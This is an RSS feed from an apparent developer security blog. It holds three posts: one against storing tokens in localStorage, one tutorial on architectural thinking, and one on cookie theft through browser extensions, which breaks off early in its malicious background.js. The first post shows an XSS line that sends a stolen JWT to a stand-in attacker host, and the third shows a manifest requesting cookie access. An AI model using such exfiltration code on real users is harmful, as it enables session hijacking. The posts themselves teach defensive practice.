<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>fr0sttt</title><link>https://fr0sttt.dev/</link><description>Recent content on fr0sttt</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Mon, 01 Jan 0001 00:00:00 +0000</lastBuildDate><atom:link href="https://fr0sttt.dev/index.xml" rel="self" type="application/rss+xml"/><item><title>Do Not Use LocalStorage To Save Session and Auth Tokens(Or Any Sensitive Information.)</title><link>https://fr0sttt.dev/p/do-not-use-localstorage-to-save-session-and-auth-tokens/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://fr0sttt.dev/p/do-not-use-localstorage-to-save-session-and-auth-tokens/</guid><description>&lt;h1 id="why-using-localstorage-to-save-sensitive-information-is-unacceptable-in-2025">Why using LocalStorage to save sensitive information is UNACCEPTABLE in 2025
&lt;/h1>&lt;p>Let&amp;rsquo;s be clear. It&amp;rsquo;s 2025. If you, as a developer, are still saving authentication tokens or any other sensitive information in localStorage, you&amp;rsquo;re doing it wrong. Period.&lt;/p>
&lt;p>I&amp;rsquo;m deeply irritated by the number of tutorials, bootcamps, and articles that perpetuate this ridiculous practice. It&amp;rsquo;s a disservice to our profession and a wide-open door to vulnerabilities that should have been eliminated long ago. There&amp;rsquo;s no longer any excuse for making this mistake.&lt;/p>
&lt;p>This article isn&amp;rsquo;t a debate. It&amp;rsquo;s an eviction order for an insecure practice. If you teach this, stop.&lt;/p>
&lt;h2 id="first-things-first-what-is-localstorage">First Things First: What is LocalStorage?
&lt;/h2>&lt;p>It&amp;rsquo;s a browser storage API. A simple JavaScript object where you throw key-value pairs. The end. It&amp;rsquo;s designed to store trivial things, like a user&amp;rsquo;s preference for a dark theme. Not to store the key to a safe. Using it for tokens is like writing down your bank password on a Post-it note and sticking it on your forehead.&lt;/p>
&lt;h1 id="what-sucks-about-localstorage-besides-security">What sucks about localStorage? (Besides security)
&lt;/h1>&lt;p>Before we even get into the security debacle, localStorage is a technically poor tool for modern web development.&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Blocks the Damn Main Thread&lt;/strong>: It&amp;rsquo;s synchronous. Every &lt;strong>getItem&lt;/strong> or &lt;strong>setItem&lt;/strong> locks up the UI. While the browser reads from disk, your application freezes. In 2025, with the obsession with performance and 60fps, using a synchronous API for I/O is just plain stupid.&lt;/li>
&lt;li>&lt;strong>Only Storage Garbage (Strings)&lt;/strong>: It doesn&amp;rsquo;t store objects. You&amp;rsquo;re forced to do the JSON.stringify() and JSON.parse() nonsense for everything, adding useless code and potential points of failure. It&amp;rsquo;s primitive.&lt;/li>
&lt;li>&lt;strong>Doesn&amp;rsquo;t Talk to Web Workers&lt;/strong>: Need to do heavy background processing to avoid crashing the page? Great. But your Web Workers don&amp;rsquo;t have access to localStorage. It&amp;rsquo;s useless for any minimally sophisticated architecture that requires shared state with background threads.&lt;/li>
&lt;li>&lt;strong>Single Origin&lt;/strong>: localStorage is locked to the exact origin. &lt;code>app.site.com&lt;/code> can&amp;rsquo;t read what &lt;code>api.site.com&lt;/code> has stored. For authentication that needs to work across subdomains, it dies here.&lt;/li>
&lt;/ul>
&lt;p>For these reasons alone, he would be a poor choice. But now, let&amp;rsquo;s get to the main crime.&lt;/p>
&lt;h1 id="the-deadly-sin-cross-site-scripting-xss">The Deadly Sin: Cross-Site Scripting (XSS)
&lt;/h1>&lt;p>This is why any senior developer will laugh at you (or fire you) if you use localStorage for tokens.&lt;/p>
&lt;p>Any script injected into your page has full and unrestricted access to localStorage. &lt;strong>ANY SCRIPT&lt;/strong>.&lt;/p>
&lt;p>An XSS attack occurs when an attacker manages to inject a piece of JavaScript into your application. A malicious comment, an unhandled URL parameter, any slip-up. And all it takes is one line:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// malicious actor script injected into your page
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kr">const&lt;/span> &lt;span class="nx">stolenToken&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">localStorage&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getItem&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;jwt_token&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// send to the server (c2, etc.)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sb">`https://hacker-server.com/stolen-token?token=?token=&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nx">stolenToken&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="sb">`&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>GAME OVER.&lt;/p>
&lt;p>The attacker has the token. They are now your user. They can access data, make purchases, transfer money, and delete the account. And it&amp;rsquo;s your fault for leaving the key under the rug. Trusting that your application is 100% XSS-proof is the height of arrogance.&lt;/p>
&lt;h1 id="the-obvious-solution-they-ignore-cookies">The Obvious Solution They Ignore: Cookies
&lt;/h1>&lt;p>The solution isn&amp;rsquo;t new, it&amp;rsquo;s not sexy, but it&amp;rsquo;s the right one and has worked for decades: cookies. But not just any cookie thrown in. Cookies configured like a pro.&lt;/p>
&lt;p>When your backend generates a token, it must enclose it in a cookie with three MANDATORY flags:&lt;/p>
&lt;ul>
&lt;li>&lt;code>HttpOnly&lt;/code>: The most important. It makes the cookie &lt;strong>INACCESSIBLE&lt;/strong> to client-side JavaScript. &lt;code>document.cookie&lt;/code> simply doesn&amp;rsquo;t see this cookie. The XSS attack we described becomes useless. The attacker&amp;rsquo;s script tries to read it and finds nothing. Problem solved.&lt;/li>
&lt;li>&lt;code>Secure&lt;/code>: Ensures that the cookie only travels over HTTPS. This prevents anyone in the middle (on a public Wi-Fi network, for example) from reading the cookie in plain text. This is basic digital hygiene.&lt;/li>
&lt;li>&lt;code>SameSite=Strict (or Lax)&lt;/code>: Your weapon against &lt;strong>CSRF (Cross-Site Request Forgery)&lt;/strong> attacks. Prevents the browser from sending the cookie in requests from other sites, preventing a user from being tricked into performing actions without knowing.&lt;/li>
&lt;/ul>
&lt;p>Your response header should look like this, no excuses:&lt;/p>
&lt;p>&lt;code>Set-Cookie: session_token=YOUR_TOKEN_HERE; HttpOnly; Secure; SameSite=Strict&lt;/code>&lt;/p>
&lt;h1 id="classic-alternative-server-sessions">Classic Alternative: Server Sessions
&lt;/h1>&lt;p>If you don&amp;rsquo;t like JWTs or have a more traditional application, use the time-tested and proven method: server-side sessions.&lt;/p>
&lt;p>In this model, the server stores all sensitive data and sends only a random session ID to the client, inside a cookie with the same flags (HttpOnly, Secure, SameSite).&lt;/p>
&lt;h1 id="no-more-excuses">No More Excuses
&lt;/h1>&lt;p>Your job isn&amp;rsquo;t to do the easiest thing, it&amp;rsquo;s to do the right thing. Safety isn&amp;rsquo;t a luxury; it&amp;rsquo;s the foundation.&lt;/p>
&lt;ul>
&lt;li>&lt;strong>NEVER&lt;/strong> use localStorage for tokens or any sensitive data.&lt;/li>
&lt;li>&lt;strong>ALWAYS&lt;/strong> use cookies.&lt;/li>
&lt;li>Your cookie &lt;strong>MUST&lt;/strong> have the HttpOnly, Secure, and SameSite attributes.&lt;/li>
&lt;li>Choose between Server-Side Sessions (stateful) or JWTs in Cookies (stateless) depending on your architecture.&lt;/li>
&lt;/ul></description></item><item><title>Stop Coding, Start Thinking: The Mental Framework To Thinking Like An Software Architect</title><link>https://fr0sttt.dev/p/test/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://fr0sttt.dev/p/test/</guid><description>&lt;p>You&amp;rsquo;re given a new project. The requirements are complex: &amp;ldquo;We need a system that allows users to upload sensitive documents. It must scale to 100 uploads per second, the process must be fast for the user, and the documents must pass OCR and validation before the user approves them. Oh, and it must be secure and highly available.&amp;rdquo;&lt;/p>
&lt;h3 id="what-is-your-first-reaction">What is your first reaction?
&lt;/h3>&lt;p>If your brain immediately jumps to &amp;ldquo;Okay, I&amp;rsquo;ll use &lt;strong>Node.js with Express and multer for the upload, and maybe a PostgreSQL table for the status&lt;/strong>,&amp;rdquo; you&amp;rsquo;re falling into the most common development trap: &lt;strong>thinking about the technology before thinking about the problem&lt;/strong>.&lt;/p>
&lt;p>The difference between someone who just codes and an architect (or senior developer) isn&amp;rsquo;t the number of frameworks they know. It&amp;rsquo;s the existence of a mental framework to break down chaos and transform it into a coherent design.&lt;/p>
&lt;p>This article will teach you this framework. It&amp;rsquo;s a four-step process for translating complex requirements into a robust architecture, before you even write the first line of code.&lt;/p>
&lt;h1 id="our-case-study-creating-a-kyc-know-your-customer">Our Case Study: Creating a KYC (Know Your Customer)
&lt;/h1>&lt;p>Imagine we&amp;rsquo;ve been tasked with building the backend for an identity verification process. The requirements are as follows:&lt;/p>
&lt;h4 id="functional-requirements">Functional Requirements:
&lt;/h4>&lt;ul>
&lt;li>
&lt;p>The user, through our mobile app, must be able to upload a photo of an identification document (e.g., a driver&amp;rsquo;s license).&lt;/p>
&lt;/li>
&lt;li>
&lt;p>The system must process this image, extracting data (name, ID number, etc.) via OCR (Optical Character Recognition).&lt;/p>
&lt;/li>
&lt;li>
&lt;p>The system needs to validate the extracted data with an external government service.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>The user&amp;rsquo;s status must be updated to &amp;ldquo;Verified&amp;rdquo; or &amp;ldquo;Rejected.&amp;rdquo;&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h4 id="non-functional-requirements-where-our-focus-will-be">Non-Functional Requirements (Where our focus will be):
&lt;/h4>&lt;ul>
&lt;li>
&lt;p>Scalability: The system must handle normal new user flows and marketing campaign peaks. We estimate peaks of up to 100 uploads per second.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Latency: The user must receive an &amp;ldquo;upload received successfully&amp;rdquo; confirmation in under 2 seconds. The final verification result can take a few minutes.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Security: We are dealing with sensitive personal documents (PII - Personally Identifiable Information). Security is critical. We need to ensure data confidentiality and integrity, both in transit and at rest, in compliance with regulations like GDPR/LGPD.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Availability: The upload functionality must be highly available. The processing itself can tolerate minor failures and recover.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h1 id="step-1-ignore-the-technology-break-the-problem-down-into-verbs">Step 1: Ignore the Technology. Break the Problem Down into &amp;ldquo;Verbs&amp;rdquo;
&lt;/h1>&lt;p>The first step is to resist the urge to code. Read the requirements and extract the essential actions, the system&amp;rsquo;s &amp;ldquo;verbs.&amp;rdquo; Tell the story of what needs to happen, in a simple and linear fashion. You don&amp;rsquo;t start building a house by choosing the brand of the hammer; you understand the steps: lay the foundation, raise the walls, install the roof.&lt;/p>
&lt;p>For our KYC system, the story is as follows:&lt;/p>
&lt;ol>
&lt;li>The user needs to &lt;strong>UPLOAD&lt;/strong> a file.&lt;/li>
&lt;li>The system needs to &lt;strong>STORE&lt;/strong> this file securely.&lt;/li>
&lt;li>The system needs to &lt;strong>NOTIFY&lt;/strong> other parts that a new file has arrived.&lt;/li>
&lt;li>A process needs to &lt;strong>READ&lt;/strong> the newly arrived file.&lt;/li>
&lt;li>This process needs to &lt;strong>PROCESS&lt;/strong> the image (OCR).&lt;/li>
&lt;li>This process needs to &lt;strong>VALIDATE&lt;/strong> the extracted data with an external service.&lt;/li>
&lt;li>The system needs to &lt;strong>UPDATE&lt;/strong> the user&amp;rsquo;s status based on the result.&lt;/li>
&lt;/ol>
&lt;p>See the magic. We&amp;rsquo;ve traded a complex paragraph for a clear and discrete chain of events. Each verb is a link in the chain, and now we can reason about each of them in isolation, which is infinitely easier.&lt;/p>
&lt;h1 id="step-2-identify-the-forces-constraints-at-play">Step 2: Identify the &amp;ldquo;Forces&amp;rdquo; (Constraints) at Play
&lt;/h1>&lt;p>Now, we look at the non-functional requirements. They aren&amp;rsquo;t a wish list; they are the forces of nature that will push, pull, and bend our architecture. A good architect doesn&amp;rsquo;t fight these forces; they use them to shape the design.&lt;/p>
&lt;p>For each force, your brain should set off an alarm:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>Force of Scalability + Latency: &amp;ldquo;100 uploads/second&amp;rdquo; and &amp;ldquo;confirmation in &amp;lt; 2s&amp;rdquo;.&lt;/strong>: Alarm bells should be going off in your head: &amp;ldquo;It&amp;rsquo;s impossible to manage this in a single monolithic API. The I/O bottleneck from receiving 100 concurrent files will saturate anything. And the full processing (OCR, validation) will definitely take longer than 2 seconds. Therefore, the user&amp;rsquo;s action (the upload) must be decoupled from everything else. The user flow cannot be synchronous.&amp;rdquo;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Force of Availability + Resilience: &amp;ldquo;Upload always available&amp;rdquo; and &amp;ldquo;processing can fail&amp;rdquo;.&lt;/strong>: Alarm bells should be going off in your head: &amp;ldquo;What if the OCR service is down for 5 minutes? Under no circumstances can this prevent new uploads. This means there must be a &amp;lsquo;buffer&amp;rsquo;, a shock absorber between the entry point and the processors. If a processor dies, another one must be able to pick up the work from the queue.&amp;rdquo;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Force of Security: &amp;ldquo;Sensitive documents, GDPR/LGPD&amp;rdquo;.&lt;/strong>: Alarm bells should be going off in your head: &amp;ldquo;Every point where this data touches is a legal and reputational liability. How does it travel over the network (encryption in transit)? How is it stored on disk (encryption at rest)? Who can read the original file? Who can see the OCR result? I need audit trails for every access.&amp;rdquo;&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h1 id="step-3-map-forces-to-design-patterns">Step 3: Map &amp;ldquo;Forces&amp;rdquo; to &amp;ldquo;Design Patterns&amp;rdquo;
&lt;/h1>&lt;p>This is where seniority pays off. Experience is largely about having a mental catalog of solutions to recurring problems. You don&amp;rsquo;t reinvent the wheel; you recognize which type of terrain calls for which type of wheel.&lt;/p>
&lt;p>Let&amp;rsquo;s map the intuitions from Step 2 to well-known architectural patterns:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>The force of &amp;ldquo;high-throughput ingress + decoupled slow processing&amp;rdquo;&lt;/strong> -&amp;gt; maps directly to the &lt;strong>Message Queue&lt;/strong> pattern. You instantly think: &amp;ldquo;This is a classic use case for SQS, RabbitMQ, or Kafka. The upload publishes a message, and workers consume it at their own pace.&amp;rdquo;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>The force of &amp;ldquo;heavy file upload + not overwhelming the API&amp;rdquo;&lt;/strong> -&amp;gt; maps to the &lt;strong>Direct Upload to Object Storage (via Presigned URLs)&lt;/strong> pattern. You think: &amp;ldquo;I don&amp;rsquo;t want these megabytes passing through my API. The pattern is to offload this directly to S3, Google Cloud Storage, or Azure Blob Storage. My API only needs to do the lightweight job of generating a temporary, secure upload link.&amp;rdquo;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>The force of &amp;ldquo;data security + granular access control&amp;rdquo;&lt;/strong> -&amp;gt; maps to the &lt;strong>Server-Side Encryption (SSE) and Principle of Least Privilege (IAM Roles)&lt;/strong> patterns. You think: &amp;ldquo;S3 solves the storage, but how do I lock it down? Provider-managed encryption is the standard. And the worker that performs OCR must only have READ permission, while the upload service only has WRITE permission.&amp;rdquo;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>The force of &amp;ldquo;multiple steps in an asynchronous workflow&amp;rdquo;&lt;/strong> -&amp;gt; maps to the &lt;strong>State Machine or Saga&lt;/strong> pattern. You think: &amp;ldquo;I need to control this flow from &lt;code>'UPLOADED'&lt;/code> -&amp;gt; &lt;code>'PROCESSING'&lt;/code> -&amp;gt; &lt;code>'VALIDATED'&lt;/code> -&amp;gt; &lt;code>'FAILED'&lt;/code>. A state machine like AWS Step Functions is the way to organize this asynchronous chaos and ensure no file gets lost.&amp;rdquo;&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>What did we do here? We didn&amp;rsquo;t invent anything. We merely recognized the problems for which robust, industry-tested solutions already exist.&lt;/p>
&lt;h1 id="step-4-always-think-in-trade-offs">Step 4: Always Think in Trade-offs
&lt;/h1>&lt;p>This is the step that separates architects from mere implementers. No choice is free. For every pattern you adopt, you must ask yourself honestly: &lt;strong>&amp;ldquo;What&amp;rsquo;s the cost?&amp;rdquo;&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>&amp;ldquo;&lt;strong>Okay, I chose a Message Queue.&lt;/strong> What&amp;rsquo;s the trade-off? I&amp;rsquo;ve added operational complexity. My system is now distributed. I need to worry about workers, about messages that fail and go to a Dead-Letter Queue (DLQ), and the flow becomes asynchronous, which means eventual consistency. Does the benefit (scalability and resilience) outweigh this cost? &lt;strong>Yes, for this problem, absolutely.&lt;/strong>&amp;rdquo;&lt;/li>
&lt;/ul>
&lt;p>&amp;ldquo;&lt;strong>Okay, Presigned URLs.&lt;/strong> What&amp;rsquo;s the trade-off? The client-side logic (mobile/web app) gets slightly more complex. It first needs to call my API to get the URL and only then perform the upload to S3. It&amp;rsquo;s one extra API call. Does the benefit (saving my API from bandwidth and processing saturation) outweigh this cost? &lt;strong>Yes, without a doubt.&lt;/strong>&amp;rdquo;&lt;/p>
&lt;h1 id="conclusion-from-confusion-to-clarity">Conclusion: From Confusion to Clarity
&lt;/h1>&lt;p>Observe what happened. We went from a nebulous set of requirements to a clear and well-defined architecture:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>A mobile client requests a &lt;strong>Presigned URL&lt;/strong> from a lightweight API endpoint.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>The client uploads the file directly to an S3 bucket, which is configured with &lt;strong>server-side encryption&lt;/strong>.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Upon receiving the new object, S3 triggers an event that creates a message in an &lt;strong>SQS Queue&lt;/strong>.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>A group of workers (services or Lambda functions) with &lt;strong>restricted IAM permissions&lt;/strong> consume messages from the queue.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>A &lt;strong>State Machine&lt;/strong> orchestrates the flow of each file through the OCR and external validation workers, finally updating the user&amp;rsquo;s status in the database.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>This is the mental framework that turns developers into architects. It moves the discussion from technology to the problem, from tools to principles. Practice it, and you will no longer be just writing code; you will be designing resilient, scalable, and secure systems on purpose.&lt;/p></description></item><item><title>Your HttpOnly Cookie Won't Save You From Everything: The Silent Attack via Browser Extensions</title><link>https://fr0sttt.dev/p/your-http-only-cookie-won-t-save-you-from-everything/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://fr0sttt.dev/p/your-http-only-cookie-won-t-save-you-from-everything/</guid><description>&lt;p>What? I&amp;rsquo;m using HttpOnly, SameSite cookies, but I&amp;rsquo;m still unsure?&lt;/p>
&lt;p>Let&amp;rsquo;s take it easy. You did everything correctly. However, there is a little-discussed risk: browser extensions.&lt;/p>
&lt;h1 id="understanding-session-risk-and-browser-extensions">Understanding Session Risk and Browser Extensions
&lt;/h1>&lt;p>As conscientious developers, we strive to follow best practices (I hope). You&amp;rsquo;ve probably already done your homework: ditched localStorage for sensitive data and protected your application&amp;rsquo;s session tokens with cookies configured as HttpOnly, Secure, and SameSite.&lt;/p>
&lt;p>This is excellent. It&amp;rsquo;s the fundamental foundation of session security on the modern web, and it protects against the vast majority of attacks, such as XSS.&lt;/p>
&lt;p>But security is a game of layers, like an onion. Today, we&amp;rsquo;ll explore a deeper, more subtle layer together, one that doesn&amp;rsquo;t involve a flaw in our code, but rather in the ecosystem in which our applications run: the user&amp;rsquo;s own browser and the trust model of extensions.&lt;/p>
&lt;p>Let&amp;rsquo;s talk about how the best-kept key can be copied if the homeowner hands over a master key to a friendly-looking stranger.&lt;/p>
&lt;h1 id="the-edge-of-the-fortress-where-httponly-protection-ends">The Edge of the Fortress: Where HttpOnly Protection Ends
&lt;/h1>&lt;p>To understand the risk, we first need to be clear about what the HttpOnly flag actually does.&lt;/p>
&lt;p>Think of it as a security rule within your &amp;ldquo;house&amp;rdquo; (your web page). The rule is clear: &amp;ldquo;No &amp;lsquo;guest&amp;rsquo; (script running on the page) may touch the family&amp;rsquo;s special cookies.&amp;rdquo; This perfectly neutralizes an XSS attack, where a malicious &amp;ldquo;guest&amp;rdquo; (an injected script) attempts to steal these cookies.&lt;/p>
&lt;p>The bottom line is this: &lt;strong>a browser extension isn&amp;rsquo;t just a &amp;ldquo;guest.&amp;rdquo; It&amp;rsquo;s the &amp;ldquo;building manager.&amp;rdquo;&lt;/strong>&lt;/p>
&lt;p>When a user installs an extension, the browser requests a series of permissions. By clicking &amp;ldquo;Accept,&amp;rdquo; the user isn&amp;rsquo;t just inviting the extension in; they&amp;rsquo;re handing it an administrator badge with elevated privileges. With this badge, the extension can operate at a level above the &amp;ldquo;house rules,&amp;rdquo; interacting directly with the browser&amp;rsquo;s APIs.&lt;/p>
&lt;h1 id="anatomy-of-an-attack-a-step-by-step-analysis">Anatomy of an Attack: A Step-by-Step Analysis
&lt;/h1>&lt;p>Let&amp;rsquo;s look at how a seemingly harmless extension like a &amp;ldquo;Color Converter&amp;rdquo; could be used to hijack a user session.&lt;/p>
&lt;h2 id="step-1-the-trust-agreement-the-manifestjson">Step 1: The Trust Agreement (The manifest.json)
&lt;/h2>&lt;p>Every extension declares its needs in a manifest file. This is where the request for privileges is made.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-json" data-lang="json">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;manifest_version&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;Super Color Picker&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;version&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;1.0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;description&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;Find the code for any color on your screen!&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;background&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;service_worker&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;background.js&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;permissions&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;cookies&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// Permission to access the Cookie API
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="s2">&amp;#34;activeTab&amp;#34;&lt;/span> &lt;span class="c1">// Permission to interact with the active tab
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">],&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;host_permissions&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;*://*.your-ecommerce.com/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// Specific permission for your site
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="s2">&amp;#34;*://*.company-dashboard.com/&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>The user sees a request that seems reasonable for the extension&amp;rsquo;s functionality and grants the permissions. They&amp;rsquo;ve given the extension the master key to read cookies on the specified domains.&lt;/p>
&lt;h2 id="step-2-the-behind-the-scenes-action-the-backgroundjs">Step 2: The Behind-the-Scenes Action (The background.js)
&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Inside the extension&amp;#39;s background.js
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">TARGET_DOMAIN&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;https://company-panel.com&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
